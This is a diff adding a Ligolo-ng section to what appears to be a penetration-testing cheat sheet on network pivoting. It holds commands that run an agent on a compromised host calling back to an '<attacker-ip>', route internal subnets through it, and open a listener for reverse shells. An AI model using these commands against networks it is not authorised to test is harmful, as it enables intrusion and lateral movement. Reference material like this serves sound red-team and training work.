@@ -31,6 +31,27 @@ ssh -R 4444:127.0.0.1:4444 user@pivot           # remote: expose your listener i
 # then proxychains via socks5 127.0.0.1 1080
 ```
 
+## Ligolo-ng (cleanest multi-hop — no proxychains needed)
+
+Ligolo gives you a real tun interface, so tools run natively (full nmap, no `-sT -Pn`):
+```
+# attacker (once): create the interface and start the listener
+sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# on the pivot: run the agent back to you
+./agent -connect <attacker-ip>:11601 -ignore-cert
+
+# back in the proxy console: pick the session, then route the internal subnet via ligolo:
+session            # select the agent
+# (new terminal) add the route to the tun:
+sudo ip route add 172.16.20.0/24 dev ligolo
+start              # in the proxy console — traffic to that subnet now tunnels
+# Reach a service on YOUR box from the internal net (e.g. for a reverse shell):
+#   in proxy console:  listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
+```
+Double pivot: run a second agent on the Tier-2 host, add its subnet as another route.
+
 ## Meterpreter autoroute (best when you already have a Meterpreter session)
 
 ```
